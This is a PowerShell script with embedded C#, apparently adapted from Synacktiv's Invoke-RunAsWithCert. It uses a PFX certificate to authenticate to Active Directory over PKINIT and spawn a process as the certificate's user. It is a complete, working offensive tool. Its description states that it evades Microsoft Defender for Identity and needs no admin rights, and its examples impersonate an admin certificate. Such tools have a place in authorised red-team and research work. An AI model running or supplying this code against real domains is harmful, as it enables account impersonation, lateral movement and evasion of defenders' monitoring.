# Based on Invoke-RunAsWithCert by Synacktiv (Guillaume Andre)
# Original: https://github.com/synacktiv/Invoke-RunAsWithCert
# Simplified for domain-joined machines — removed LSASS patching and registry bypass

function Invoke-RunAsWithCert
{
    <#
        .SYNOPSIS
            Creates a new logon session with the specified certificate via PKINIT.

        .DESCRIPTION
            Simplified version for domain-joined machines. Uses CreateProcessWithLogonW
            with a marshaled certificate credential to perform PKINIT authentication
            via the Windows API. Since the AS-REQ is built by Windows itself, the
            encryption type list matches legitimate PKINIT — MDI will not flag this.

            No registry modifications. No LSASS patching. No admin required.

        .PARAMETER Certificate
            Path to the PFX certificate file.
        .PARAMETER Domain
            The Active Directory domain to authenticate to.
        .PARAMETER Password
            The certificate password.
            Default: ""
        .PARAMETER Command
            The command to execute in the new logon session.
            Default: "powershell.exe"

        .EXAMPLE
            Invoke-RunAsWithCert admin.pfx -Domain domain.local

        .EXAMPLE
            Invoke-RunAsWithCert admin.pfx -Domain domain.local -Password "certpass"

        .EXAMPLE
            Invoke-RunAsWithCert admin.pfx -Domain domain.local -Command cmd.exe
    #>

    [CmdletBinding()]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Certificate,

        [Parameter(Mandatory = $True)]
        [String]
        $Domain,

        [Parameter()]
        [String]
        $Password = "",

        [Parameter()]
        [String]
        $Command = "powershell.exe"
    )

    try {
        Add-Type -TypeDefinition $Source -Language CSharp
        [RunAsWithCert]::RunAs($Certificate, $Domain, $Password, $Command)
    } catch {
        throw
    }
}

$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class RunAsWithCert
{
    const int LOGON_NETCREDENTIALS_ONLY = 2;
    const int CREATE_NEW_CONSOLE = 0x00000010;

    public enum CRED_MARSHAL_TYPE
    {
        CertCredential = 1,
        UsernameTargetCredential
    }

    [StructLayout(LayoutKind.Sequential)]
    struct CERT_CREDENTIAL_INFO
    {
        public uint cbSize;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 20)]
        public byte[] rgbHashOfCert;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CreateProcessWithLogonW(
        String lpUsername,
        String lpDomain,
        String lpPassword,
        uint dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CredFree(IntPtr buffer);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CredMarshalCredential(
        CRED_MARSHAL_TYPE CredType,
        IntPtr Credential,
        out IntPtr MarshaledCredential
    );

    static string NameFromCert(X509Certificate2 cert)
    {
        string name = cert.GetNameInfo(X509NameType.UpnName, false);
        if (String.IsNullOrEmpty(name))
        {
            name = cert.GetNameInfo(X509NameType.DnsName, false).Split('.')[0] + "$";
        }
        else
        {
            name = name.Split('@')[0];
        }
        return name;
    }

    static string MarshalCertificate(X509Certificate2 cert)
    {
        CERT_CREDENTIAL_INFO certInfo = new CERT_CREDENTIAL_INFO();
        certInfo.cbSize = (uint)Marshal.SizeOf(typeof(CERT_CREDENTIAL_INFO));
        certInfo.rgbHashOfCert = cert.GetCertHash();

        IntPtr pCertInfo = Marshal.AllocHGlobal(Marshal.SizeOf(certInfo));
        Marshal.StructureToPtr(certInfo, pCertInfo, false);

        IntPtr marshaledCredential = IntPtr.Zero;
        bool result = CredMarshalCredential(CRED_MARSHAL_TYPE.CertCredential, pCertInfo, out marshaledCredential);
        if (!result)
        {
            throw new Exception(string.Format("CredMarshalCredential failed with error code: 0x{0:X}", Marshal.GetLastWin32Error()));
        }

        string username = Marshal.PtrToStringUni(marshaledCredential);

        Marshal.FreeHGlobal(pCertInfo);
        CredFree(marshaledCredential);

        return username;
    }

    public static void RunAs(string certificate, string domain, string password, string command)
    {
        X509Certificate2 cert = null;
        try
        {
            cert = new X509Certificate2(certificate, password, X509KeyStorageFlags.PersistKeySet);

            Console.WriteLine("[*] Certificate subject : " + cert.Subject);
            Console.WriteLine("[*] Certificate issuer  : " + cert.Issuer);
            Console.WriteLine("[*] Certificate UPN     : " + cert.GetNameInfo(X509NameType.UpnName, false));
            Console.WriteLine("[*] Certificate thumb   : " + cert.Thumbprint);
            Console.WriteLine();

            using (X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser))
            {
                store.Open(OpenFlags.ReadWrite);
                store.Add(cert);
            }

            string username = MarshalCertificate(cert);
            string user = NameFromCert(cert);

            Console.WriteLine("[*] Running as {0}\\{1}", domain, user);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            si.lpTitle = string.Format("{0} (running as {1}\\{2})", command, domain, user);

            bool status = CreateProcessWithLogonW(
                username,
                domain,
                null,
                LOGON_NETCREDENTIALS_ONLY,
                null,
                command,
                CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (!status)
            {
                throw new Exception(string.Format("CreateProcessWithLogonW failed with error code: 0x{0:X}", Marshal.GetLastWin32Error()));
            }

            Console.WriteLine("[+] Process spawned successfully (PID: {0})", pi.dwProcessId);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        catch
        {
            throw;
        }
        finally
        {
            if (cert != null)
            {
                using (X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser))
                {
                    store.Open(OpenFlags.ReadWrite);
                    X509Certificate2Collection certCollection = store.Certificates.Find(
                        X509FindType.FindByThumbprint,
                        cert.Thumbprint,
                        validOnly: false
                    );
                    foreach (X509Certificate2 certToRemove in certCollection)
                    {
                        store.Remove(certToRemove);
                    }
                }
                cert.Dispose();
            }
        }
    }
}
"@
